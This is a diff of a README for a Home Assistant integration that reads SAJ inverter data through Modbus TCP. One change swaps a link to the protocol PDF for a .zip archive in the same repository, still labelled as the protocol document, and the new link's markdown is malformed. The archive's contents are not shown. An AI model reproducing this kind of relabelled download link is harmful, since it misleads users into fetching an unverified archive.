@@ -2,7 +2,7 @@
 
 Home Assistant Custom Component for reading data from SAJ Inverters through Modbus TCP.
 
-Implements SAJ H2/HS2 Inverter registers from [SAJ H2-Protocol](https://github.com/stanus74/home-assistant-saj-h2-modbus/blob/main/H2-3~6K-S2%20single%20phase%20communication%20protocol%20-2022.12.02-EN.pdf)
+Implements SAJ H2/HS2 Inverter registers from [SAJ H2-Protocol]https://github.com/stanus74/home-assistant-saj-h2-modbus/blob/main/saj-h2-modbus.zip)
 
 Idea based on [home-assistant-solaredge-modbus](https://github.com/binsentsu/home-assistant-solaredge-modbus) from [@binsentsu](https://github.com/binsentsu). Modified for SAJ Inverters by [@wimb0](https://github.com/wimb0)
 
@@ -39,7 +39,7 @@ The AIO3 has port 502 open, allowing us to access the Modbus data. The IP addres
 
 However, the connection is not as stable and fast as with a TCP Modbus converter like the Elfin EW10. [Elfin EW10 - Hi-Flying](http://www.hi-flying.com/elfin-ew10-elfin-ew11)
 
-I have tested with EW10 and the Connection is stable and responsive.
+I have tested with EW10a and the Connection is stable and responsive.
 
 Therefore, the addon has functions programmed to check the connection and restore it if necessary, as well as further checking the data provided.
 
